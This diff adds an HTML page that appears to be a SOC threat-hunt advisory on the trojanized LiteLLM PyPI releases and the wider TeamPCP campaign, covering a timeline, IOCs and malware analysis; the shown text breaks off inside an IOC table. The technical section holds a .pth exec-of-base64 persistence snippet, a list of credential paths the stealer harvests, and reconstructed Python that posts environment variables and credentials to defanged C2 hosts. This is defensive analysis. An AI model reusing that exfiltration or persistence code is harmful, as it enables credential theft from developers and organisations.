@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TeamPCP &amp; LiteLLM PyPI Supply Chain Attack — SOC Threat Hunt Brief</title>
+  <style>
+    /* ── Base ── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:        #0d1117;
+      --surface:   #161b22;
+      --surface2:  #1c2230;
+      --border:    #30363d;
+      --accent:    #f78166;
+      --accent2:   #79c0ff;
+      --accent3:   #56d364;
+      --warn:      #e3b341;
+      --critical:  #ff6b6b;
+      --text:      #c9d1d9;
+      --text-muted:#8b949e;
+      --code-bg:   #0d1117;
+      --tag-red:   rgba(247,129,102,.15);
+      --tag-blue:  rgba(121,192,255,.15);
+      --tag-green: rgba(86,211,100,.15);
+      --tag-warn:  rgba(227,179,65,.15);
+    }
+
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    /* ── Layout ── */
+    .container { max-width: 1020px; margin: 0 auto; padding: 0 24px; }
+
+    /* ── Top Banner ── */
+    .top-banner {
+      background: repeating-linear-gradient(
+        45deg,
+        #1a0000,
+        #1a0000 10px,
+        #2a0000 10px,
+        #2a0000 20px
+      );
+      border-bottom: 2px solid var(--critical);
+      text-align: center;
+      padding: 8px 16px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .15em;
+      color: var(--critical);
+      text-transform: uppercase;
+    }
+
+    /* ── Nav ── */
+    .nav {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      max-width: 1020px;
+      margin: 0 auto;
+    }
+    .nav-brand {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent2);
+      letter-spacing: .05em;
+      text-transform: uppercase;
+    }
+    .nav-links { display: flex; gap: 20px; list-style: none; }
+    .nav-links a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: .04em;
+      text-transform: uppercase;
+      transition: color .15s;
+    }
+    .nav-links a:hover { color: var(--accent2); }
+
+    /* ── Hero ── */
+    .hero {
+      background: linear-gradient(135deg, #0d1117 0%, #161b22 40%, #1a1a2e 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 60px 24px 48px;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse 80% 50% at 50% 0%, rgba(247,129,102,.08), transparent);
+      pointer-events: none;
+    }
+    .hero-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      padding: 3px 10px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+    }
+    .tag-red    { background: var(--tag-red);   color: var(--critical); border: 1px solid rgba(247,129,102,.3); }
+    .tag-blue   { background: var(--tag-blue);  color: var(--accent2);  border: 1px solid rgba(121,192,255,.3); }
+    .tag-green  { background: var(--tag-green); color: var(--accent3);  border: 1px solid rgba(86,211,100,.3); }
+    .tag-warn   { background: var(--tag-warn);  color: var(--warn);     border: 1px solid rgba(227,179,65,.3); }
+
+    .hero h1 {
+      font-size: clamp(22px, 4vw, 36px);
+      font-weight: 800;
+      line-height: 1.2;
+      color: #fff;
+      max-width: 800px;
+      margin-bottom: 16px;
+    }
+    .hero h1 span { color: var(--accent); }
+    .hero-sub {
+      color: var(--text-muted);
+      font-size: 15px;
+      max-width: 700px;
+      margin-bottom: 28px;
+    }
+    .hero-stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .stat-card {
+      background: rgba(255,255,255,.04);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 20px;
+      min-width: 140px;
+    }
+    .stat-card .stat-val {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--accent);
+      display: block;
+    }
+    .stat-card .stat-val.blue  { color: var(--accent2); }
+    .stat-card .stat-val.green { color: var(--accent3); }
+    .stat-card .stat-val.warn  { color: var(--warn); }
+    .stat-card .stat-label {
+      font-size: 11px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: .06em;
+    }
+
+    /* ── Main Content ── */
+    main { padding: 48px 0 80px; }
+
+    section { margin-bottom: 60px; }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+    .section-num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      background: var(--accent);
+      color: #000;
+      font-size: 12px;
+      font-weight: 800;
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+    .section-num.blue  { background: var(--accent2); }
+    .section-num.green { background: var(--accent3); }
+    .section-num.warn  { background: var(--warn); }
+    section h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    p { color: var(--text); margin-bottom: 14px; }
+    p:last-child { margin-bottom: 0; }
+
+    /* ── Alert Box ── */
+    .alert {
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .alert-critical { background: rgba(255,107,107,.08); border: 1px solid rgba(255,107,107,.3); }
+    .alert-warn     { background: rgba(227,179,65,.08);  border: 1px solid rgba(227,179,65,.3); }
+    .alert-info     { background: rgba(121,192,255,.08); border: 1px solid rgba(121,192,255,.3); }
+    .alert-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+    .alert-body { flex: 1; }
+    .alert-title { font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 4px; }
+    .alert-critical .alert-title { color: var(--critical); }
+    .alert-warn     .alert-title { color: var(--warn); }
+    .alert-info     .alert-title { color: var(--accent2); }
+    .alert p { font-size: 13.5px; margin-bottom: 0; }
+
+    /* ── Timeline ── */
+    .timeline { position: relative; padding-left: 28px; }
+    .timeline::before {
+      content: "";
+      position: absolute;
+      left: 7px;
+      top: 6px;
+      bottom: 6px;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--accent), var(--accent2), var(--accent3));
+    }
+    .tl-item {
+      position: relative;
+      margin-bottom: 28px;
+    }
+    .tl-item:last-child { margin-bottom: 0; }
+    .tl-dot {
+      position: absolute;
+      left: -24px;
+      top: 4px;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 2px solid var(--bg);
+    }
+    .tl-dot.red   { background: var(--critical); box-shadow: 0 0 8px var(--critical); }
+    .tl-dot.blue  { background: var(--accent2);  box-shadow: 0 0 8px var(--accent2); }
+    .tl-dot.green { background: var(--accent3);  box-shadow: 0 0 8px var(--accent3); }
+    .tl-dot.warn  { background: var(--warn);     box-shadow: 0 0 8px var(--warn); }
+    .tl-date {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .07em;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+    .tl-date.red   { color: var(--critical); }
+    .tl-date.blue  { color: var(--accent2); }
+    .tl-date.green { color: var(--accent3); }
+    .tl-date.warn  { color: var(--warn); }
+    .tl-item h4 { color: #fff; font-size: 15px; font-weight: 700; margin-bottom: 6px; }
+    .tl-item p  { font-size: 13.5px; margin-bottom: 0; }
+
+    /* ── Card Grid ── */
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 16px;
+    }
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      transition: border-color .2s;
+    }
+    .card:hover { border-color: var(--accent2); }
+    .card-icon { font-size: 22px; margin-bottom: 12px; }
+    .card h4 { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+    .card p  { font-size: 13px; color: var(--text-muted); margin-bottom: 0; }
+
+    /* ── Tables ── */
+    .table-wrap { overflow-x: auto; border-radius: 10px; border: 1px solid var(--border); }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    thead tr { background: var(--surface2); }
+    thead th {
+      padding: 10px 14px;
+      text-align: left;
+      color: var(--text-muted);
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .07em;
+      border-bottom: 1px solid var(--border);
+    }
+    tbody tr { border-bottom: 1px solid rgba(48,54,61,.5); transition: background .15s; }
+    tbody tr:last-child { border-bottom: none; }
+    tbody tr:hover { background: rgba(255,255,255,.03); }
+    tbody td { padding: 10px 14px; vertical-align: top; }
+    td code, th code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; }
+    .td-critical { color: var(--critical); font-weight: 700; }
+    .td-warn     { color: var(--warn);     font-weight: 700; }
+    .td-green    { color: var(--accent3);  font-weight: 700; }
+    .td-blue     { color: var(--accent2);  }
+    .td-muted    { color: var(--text-muted); font-size: 12px; }
+
+    /* ── Code Blocks ── */
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+    .code-block:last-child { margin-bottom: 0; }
+    .code-header {
+      background: var(--surface2);
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border);
+    }
+    .code-lang {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      color: var(--accent2);
+    }
+    .code-desc { font-size: 12px; color: var(--text-muted); }
+    pre {
+      padding: 16px;
+      overflow-x: auto;
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+      font-size: 12.5px;
+      line-height: 1.65;
+      color: var(--text);
+      white-space: pre;
+    }
+    .kw  { color: #ff79c6; }   /* keywords */
+    .st  { color: #f1fa8c; }   /* strings */
+    .cm  { color: #6272a4; font-style: italic; } /* comments */
+    .fn  { color: #50fa7b; }   /* functions */
+    .op  { color: var(--accent2); } /* operators */
+    .nm  { color: var(--accent);  } /* numbers / names */
+
+    /* ── MITRE Table ── */
+    .mitre-id {
+      font-family: "SFMono-Regular", Consolas, monospace;
+      font-size: 12px;
+      color: var(--accent2);
+      white-space: nowrap;
+    }
+
+    /* ── Step List ── */
+    .step-list { counter-reset: step; list-style: none; }
+    .step-list li {
+      counter-increment: step;
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+      padding: 14px 0;
+      border-bottom: 1px solid rgba(48,54,61,.5);
+    }
+    .step-list li:last-child { border-bottom: none; }
+    .step-list li::before {
+      content: counter(step, decimal-leading-zero);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      width: 32px;
+      height: 32px;
+      background: rgba(247,129,102,.12);
+      border: 1px solid rgba(247,129,102,.3);
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 800;
+      color: var(--accent);
+      font-family: "SFMono-Regular", Consolas, monospace;
+    }
+    .step-list li > div h4 { font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+    .step-list li > div p  { font-size: 13px; color: var(--text-muted); margin-bottom: 0; }
+
+    /* ── Resources ── */
+    .resource-list { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+    .resource-list li {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      transition: border-color .15s;
+    }
+    .resource-list li:hover { border-color: var(--accent2); }
+    .resource-icon { font-size: 16px; flex-shrink: 0; margin-top: 2px; }
+    .resource-body a {
+      color: var(--accent2);
+      font-size: 13.5px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .resource-body a:hover { text-decoration: underline; }
+    .resource-body p { font-size: 12px; color: var(--text-muted); margin-top: 2px; margin-bottom: 0; }
+
+    /* ── IOC Pill ── */
+    .ioc { display: inline-block; background: rgba(247,129,102,.1); border: 1px solid rgba(247,129,102,.25); border-radius: 4px; padding: 1px 7px; font-family: "SFMono-Regular", Consolas, monospace; font-size: 12px; color: var(--accent); }
+    .ioc.blue { background: rgba(121,192,255,.1); border-color: rgba(121,192,255,.25); color: var(--accent2); }
+    .ioc.green { background: rgba(86,211,100,.1); border-color: rgba(86,211,100,.25); color: var(--accent3); }
+
+    /* ── Footer ── */
+    footer {
+      background: var(--surface);
+      border-top: 1px solid var(--border);
+      padding: 28px 24px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+    footer strong { color: var(--text); }
+
+    /* ── Divider ── */
+    .divider { height: 1px; background: var(--border); margin: 40px 0; }
+
+    /* ── Two-col ── */
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media (max-width: 680px) { .two-col { grid-template-columns: 1fr; } }
+
+    /* ── Print ── */
+    @media print {
+      .nav, .top-banner { display: none; }
+      body { background: #fff; color: #000; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── Top Banner ── -->
+<div class="top-banner">
+  ⚠ TLP:AMBER — Distribution limited to government contractors and internal SOC personnel ⚠
+</div>
+
+<!-- ── Navigation ── -->
+<nav class="nav">
+  <div class="nav-inner">
+    <span class="nav-brand">SOC Threat Hunt Brief</span>
+    <ul class="nav-links">
+      <li><a href="#overview">Overview</a></li>
+      <li><a href="#timeline">Timeline</a></li>
+      <li><a href="#technical">Technical</a></li>
+      <li><a href="#iocs">IOCs</a></li>
+      <li><a href="#hunting">Hunt</a></li>
+      <li><a href="#response">Response</a></li>
+      <li><a href="#resources">Resources</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- ── Hero ── -->
+<header class="hero">
+  <div class="container">
+    <div class="hero-meta">
+      <span class="tag tag-red">CRITICAL — CVE-2026-33634</span>
+      <span class="tag tag-blue">Supply Chain Attack</span>
+      <span class="tag tag-warn">GovCon / GCC Advisory</span>
+      <span class="tag tag-green">Published: March 30, 2026</span>
+    </div>
+    <h1>How <span>TeamPCP</span> Backdoored the World's Most Popular AI Gateway — and Why GovCon Environments Are Exposed</h1>
+    <p class="hero-sub">
+      A cascading supply chain compromise starting with a single Trivy CI/CD token culminated in the backdooring of LiteLLM on PyPI — a package with 3.4 million daily downloads used across AI-integrated government contractor environments.
+    </p>
+    <div class="hero-stats">
+      <div class="stat-card">
+        <span class="stat-val">3.4M</span>
+        <span class="stat-label">Daily Downloads</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val blue">9.4</span>
+        <span class="stat-label">CVSS4B Score</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val warn">~3 hrs</span>
+        <span class="stat-label">Window of Exposure</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val">Mar 24</span>
+        <span class="stat-label">Date of Attack (2026)</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-val green">2 pkgs</span>
+        <span class="stat-label">Poisoned Versions</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ── Main ── -->
+<main>
+<div class="container">
+
+  <!-- ── 01 EXECUTIVE OVERVIEW ── -->
+  <section id="overview">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Executive Overview</h2>
+    </div>
+
+    <div class="alert alert-critical">
+      <span class="alert-icon">🚨</span>
+      <div class="alert-body">
+        <div class="alert-title">Immediate Action Required</div>
+        <p>If your organization installed or upgraded <code>litellm</code> via pip on <strong>March 24, 2026 between 10:39 UTC and 16:00 UTC</strong>, assume full compromise. Rotate all secrets, revoke credentials, and initiate IR procedures immediately.</p>
+      </div>
+    </div>
+
+    <p>On March 24, 2026, threat actor <strong>TeamPCP</strong> published two trojanized versions of the <strong>litellm</strong> Python package to PyPI — versions <span class="ioc">1.82.7</span> and <span class="ioc">1.82.8</span>. LiteLLM is an open-source AI gateway used by developers and organizations to route requests across 100+ LLM APIs (OpenAI, Azure, Anthropic, Bedrock, etc.).</p>
+
+    <p>The attack did not exploit a vulnerability in LiteLLM's code. Instead, TeamPCP compromised the CI/CD pipeline that publishes LiteLLM to PyPI — specifically by first poisoning <strong>Aqua Security's Trivy</strong> container scanner, which ran inside LiteLLM's GitHub Actions build process. This allowed the attacker to silently steal the PyPI publish token and inject a multi-stage credential-stealing backdoor into the published package.</p>
+
+    <p>For <strong>government contractors and GCC environments</strong>, the risk is acute: LiteLLM is a common integration layer for AI-powered applications, internal copilots, and LLM proxy deployments that may have access to cloud credentials, API keys, Kubernetes configs, and sensitive environment secrets.</p>
+
+    <div class="card-grid" style="margin-top: 24px;">
+      <div class="card">
+        <div class="card-icon">🎯</div>
+        <h4>Who Is at Risk?</h4>
+        <p>Organizations that pip-installed or upgraded litellm on March 24, 2026. CI/CD pipelines, Docker-based deployments without pinned deps, developer workstations, and self-hosted LLM proxy servers.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">💀</div>
+        <h4>What Can the Malware Do?</h4>
+        <p>Harvest cloud credentials, SSH keys, K8s secrets, .env files, crypto wallets, and CI/CD tokens. Deploy privileged Kubernetes pods. Install a persistent systemd backdoor for ongoing access.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🏛️</div>
+        <h4>GovCon Specific Risk</h4>
+        <p>Exposure of GCC tenant API keys, Azure Government credentials, CAC-adjacent service account tokens, and FedRAMP boundary secrets. Potential for lateral movement into controlled environments.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon">🛡️</div>
+        <h4>Who Was NOT Impacted</h4>
+        <p>Organizations running the official LiteLLM Proxy Docker image were not affected — it pins dependencies in requirements.txt and does not pull from PyPI at runtime.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 02 ATTACK TIMELINE ── -->
+  <section id="timeline">
+    <div class="section-header">
+      <span class="section-num blue">02</span>
+      <h2>Attack Timeline — The TeamPCP Campaign</h2>
+    </div>
+
+    <p>This was not an isolated incident. TeamPCP executed a cascading five-day campaign targeting open-source security tooling used in developer CI/CD pipelines. LiteLLM was the third major victim.</p>
+
+    <div class="timeline">
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 19, 2026 — Day 1</div>
+        <h4>Stage 1: Aqua Security Trivy Compromised</h4>
+        <p>TeamPCP obtained a GitHub PAT (personal access token) belonging to an Aqua Security maintainer. Using it, they forcibly overrode 76 of 77 version tags in <code>aquasecurity/trivy-action</code> and all 7 tags in <code>aquasecurity/setup-trivy</code>, redirecting trusted CI tags to malicious commits containing a credential harvester. Any workflow pinning <code>aquasecurity/trivy-action@v0.x</code> now executed attacker-controlled code.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot warn"></div>
+        <div class="tl-date warn">March 23, 2026 — Day 5</div>
+        <h4>Stage 2: Checkmarx GitHub Actions &amp; VS Code Extensions Compromised</h4>
+        <p>Credentials harvested from Trivy CI runs were used to compromise Checkmarx's <code>ast-github-action</code> and multiple OpenVSX VS Code extensions. An identical credential stealer was injected, exfiltrating secrets to typosquat domain <span class="ioc">checkmarx.zone</span>. Over 66 npm packages were subsequently compromised via stolen npm tokens, introducing <strong>CanisterWorm</strong> — the first publicly documented npm malware to use an Internet Computer Protocol (ICP) blockchain canister as a C2 dead-drop.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 24, 2026 — Day 6 — 10:39 UTC</div>
+        <h4>Stage 3: LiteLLM's CI/CD Pipeline Poisoned — PyPI Token Stolen</h4>
+        <p>LiteLLM's GitHub Actions pipeline ran Trivy as part of its build process, pulling from <code>apt</code> without a pinned version. The compromised Trivy action executed, dumping <code>Runner.Worker</code> process memory and harvesting the <span class="ioc">PYPI_PUBLISH</span> token from the GitHub Actions environment. TeamPCP now had direct publish access to the <code>litellm</code> PyPI package.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot red"></div>
+        <div class="tl-date red">March 24, 2026 — 10:39 UTC &amp; 10:52 UTC</div>
+        <h4>Malicious litellm 1.82.7 and 1.82.8 Published to PyPI</h4>
+        <p>Within 13 minutes, two backdoored versions were live on PyPI. Version 1.82.7 embedded a base64-encoded payload in <code>litellm/proxy/proxy_server.py</code>. Version 1.82.8 escalated persistence by adding a <span class="ioc">litellm_init.pth</span> file to site-packages, triggering the payload on every Python interpreter startup — no import required.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot green"></div>
+        <div class="tl-date green">March 24, 2026 — ~16:00 UTC</div>
+        <h4>PyPI Quarantines Packages — ~3 Hour Exposure Window</h4>
+        <p>PyPI quarantined both versions approximately 3 hours after publication. The last known-clean version is <span class="ioc green">litellm 1.82.6</span> (published March 22, 2026). CVE-2026-33634 was assigned with a CVSS4B score of 9.4.</p>
+      </div>
+
+      <div class="tl-item">
+        <div class="tl-dot blue"></div>
+        <div class="tl-date blue">March 25–26, 2026 — Ongoing</div>
+        <h4>TeamPCP Continues — Telnyx PyPI SDK Compromised</h4>
+        <p>The campaign did not stop with LiteLLM. Malicious versions of the Telnyx Python SDK (<span class="ioc">4.87.1</span>, <span class="ioc">4.87.2</span>) were published. TeamPCP introduces a Windows-specific payload variant that downloads <code>hangup.wav</code> from C2, decodes an XOR-obfuscated executable from audio frames, and drops it as <code>msbuild.exe</code> in the Windows Startup folder.</p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ── 03 TECHNICAL ANALYSIS ── -->
+  <section id="technical">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>Technical Analysis — Three-Stage Malware</h2>
+    </div>
+
+    <div class="alert alert-info">
+      <span class="alert-icon">🔬</span>
+      <div class="alert-body">
+        <div class="alert-title">Analyst Note</div>
+        <p>Both compromised versions share the same core payload. Version 1.82.8 adds a persistence mechanism via Python's <code>.pth</code> file injection, making it significantly more dangerous as it fires on every Python invocation — even in environments that never directly import litellm.</p>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:16px; margin-top:8px;">Stage 1 — Credential Harvester</h3>
+    <p>On execution, the payload sweeps the host filesystem and environment for credentials across more than 50 known paths:</p>
+
+    <div class="two-col" style="margin-bottom: 24px;">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Target Type</th><th>Paths / Patterns</th></tr></thead>
+          <tbody>
+            <tr><td>SSH Keys</td><td class="td-blue"><code>~/.ssh/id_*</code>, <code>~/.ssh/config</code></td></tr>
+            <tr><td>Environment Variables</td><td class="td-blue"><code>.env</code>, <code>.envrc</code>, process env dump</td></tr>
+            <tr><td>AWS Credentials</td><td class="td-blue"><code>~/.aws/credentials</code>, <code>~/.aws/config</code></td></tr>
+            <tr><td>GCP / Azure</td><td class="td-blue"><code>~/.config/gcloud/</code>, <code>~/.azure/</code></td></tr>
+            <tr><td>Kubernetes</td><td class="td-blue"><code>~/.kube/config</code>, SA tokens, cluster secrets</td></tr>
+            <tr><td>Docker</td><td class="td-blue"><code>~/.docker/config.json</code></td></tr>
+            <tr><td>Database</td><td class="td-blue"><code>.pgpass</code>, <code>~/.my.cnf</code>, connection strings</td></tr>
+            <tr><td>Crypto Wallets</td><td class="td-blue">Wallet files, seed phrase patterns</td></tr>
+            <tr><td>CI/CD Tokens</td><td class="td-blue">GitHub PAT, npm, GitLab, CircleCI</td></tr>
+            <tr><td>Shell History</td><td class="td-blue"><code>~/.bash_history</code>, <code>~/.zsh_history</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">Stage 2 — Kubernetes Lateral Movement</h3>
+        <p style="font-size:13.5px; margin-bottom:12px;">If a Kubernetes service account token is present, the malware:</p>
+        <ul style="color:var(--text); font-size:13.5px; padding-left:18px; line-height:1.8;">
+          <li>Reads <strong>all secrets across all namespaces</strong></li>
+          <li>Enumerates all cluster nodes</li>
+          <li>Deploys a privileged <code>alpine:latest</code> pod to <strong>every node</strong> in <code>kube-system</code></li>
+          <li>Mounts the host filesystem (<code>/</code>) into the pod</li>
+          <li>Installs a persistent backdoor via the mounted host</li>
+        </ul>
+        <div class="alert alert-warn" style="margin-top:14px;">
+          <span class="alert-icon">⚠️</span>
+          <div class="alert-body">
+            <div class="alert-title">K8s Backdoor Pods</div>
+            <p>Look for pods named <span class="ioc">node-setup-*</span> in the <code>kube-system</code> namespace. These are attacker-controlled persistent backdoors.</p>
+          </div>
+        </div>
+        <h3 style="color:#fff; font-size:15px; margin-top:20px; margin-bottom:10px;">Stage 3 — Systemd Persistence</h3>
+        <p style="font-size:13.5px;">A user-level systemd service (<span class="ioc">sysmon.service</span>) is installed at <code>~/.config/systemd/user/</code>. It polls <span class="ioc">checkmarx.zone/raw</span> on a schedule to download and execute additional binaries — enabling ongoing C2 access after initial credentials have been rotated.</p>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:8px;">Persistence Mechanism — The .pth File Trick</h3>
+    <p>Python's site-packages mechanism automatically executes any <code>.pth</code> file found at interpreter startup. By inserting <span class="ioc">litellm_init.pth</span> into site-packages, version 1.82.8 ensures payload execution on every Python invocation system-wide — including in virtual environments. This is a known but underappreciated Python persistence technique that bypasses most application-layer monitoring.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python — .pth Persistence Mechanism</span>
+        <span class="code-desc">How litellm_init.pth triggers payload execution</span>
+      </div>
+      <pre><span class="cm"># site-packages/litellm_init.pth  (34,628 bytes)</span>
+<span class="cm"># Python evaluates import lines in .pth files at every interpreter startup</span>
+<span class="cm"># No explicit "import litellm" needed — fires for ALL python invocations</span>
+
+<span class="kw">import</span> os, base64, subprocess
+<span class="cm"># Decodes and executes the embedded base64 payload</span>
+<span class="fn">exec</span>(<span class="fn">base64.b64decode</span>(<span class="st">b"&lt;REDACTED_PAYLOAD&gt;"</span>))</pre>
+    </div>
+
+    <h3 style="color:#fff; font-size:16px; margin-bottom:14px; margin-top:8px;">Exfiltration Infrastructure</h3>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Python (Conceptual Reconstruction)</span>
+        <span class="code-desc">Credential exfiltration to C2 — Stage 1 payload behavior</span>
+      </div>
+      <pre><span class="cm"># Attacker C2 endpoints observed in payload analysis</span>
+C2_ENDPOINTS = [
+    <span class="st">"http://83.142.209[.]203:8080/collect"</span>,   <span class="cm"># Primary C2 (defanged)</span>
+    <span class="st">"https://models.litellm[.]cloud/ingest"</span>,  <span class="cm"># Typosquat C2 domain</span>
+    <span class="st">"https://checkmarx[.]zone/raw"</span>,          <span class="cm"># Persistence polling / stage-2 DL</span>
+]
+
+<span class="cm"># Payload harvests to dict, POSTs encrypted bundle</span>
+<span class="kw">import</span> json, requests, socket
+bundle = {
+    <span class="st">"host"</span>: socket.<span class="fn">gethostname</span>(),
+    <span class="st">"env"</span>:  dict(os.environ),
+    <span class="st">"creds"</span>: harvest_filesystem(),   <span class="cm"># sweeps 50+ paths</span>
+    <span class="st">"k8s"</span>:  harvest_kubernetes(),
+}
+requests.<span class="fn">post</span>(C2_ENDPOINTS[<span class="nm">0</span>], json=bundle, timeout=<span class="nm">10</span>)</pre>
+    </div>
+  </section>
+
+  <!-- ── 04 IOCs ── -->
+  <section id="iocs">
+    <div class="section-header">
+      <span class="section-num warn">04</span>
+      <h2>Indicators of Compromise (IOCs)</h2>
+    </div>
+
+    <div class="alert alert-warn">
+      <span class="alert-icon">📋</span>
+      <div class="alert-body">
+        <div class="alert-title">TLP:AMBER — Handle Appropriately</div>
+        <p>Block all C2 infrastructure at the network perimeter immediately. IOC list sourced from Datadog Security Labs, Wiz, Sonatype, and ReversingLabs analyses. IOC CSV available at the Datadog GitHub repository.</p>
+      </div>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">Network Indicators</h3>
+    <div class="table-wrap" style="margin-bottom: 24px;">
+      <table>
+        <thead>
+          <tr><th>Indicator</th><th>Type</th><th>Role</th><th>Confidence</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><span class="ioc">83.142.209[.]203</span></td><td>IPv4</td><td>Primary C2 — credential collection endpoint (port 8080)</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><span class="ioc">83.142.209[.]11</span></td><td>IPv4</td><td>Secondary C2 — resolves to checkmarx.zone</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><span class="ioc">models.litellm[.]cloud</span></td><td>Domain</td><td>Typosquat of legitimate litellm.cloud — C2 endpoint</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><span class="ioc">checkmarx[.]zone</span></td><td>Domain</td><td>Stage-2 payload polling / persistence C2</td><td class="td-critical">HIGH</td></tr>
+          <tr><td><code>HTTP POST :8080/collect</code></td><td>Pattern</td><td>Exfiltration traffic signature</td><td class="td-warn">MEDIUM</td></tr>
+          <tr><td><code>hangup.wav</code> / <code>ringtone.wav</code></td><td>Filename</td><td>Windows/Linux payload delivery (disguised executable)</td><td class="td-warn">MEDIUM</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="color:#fff; font-size:15px; margin-bottom:12px;">File System &amp; Package Indicators</h3>
+    <div class="table-wrap" style="margin-bottom: 24px;">
+      <table>
+        <thead>
+          <tr><th>Indicator</th><th>Type</th><th>Notes</th></tr>
+        </thead>
+        <tbody>
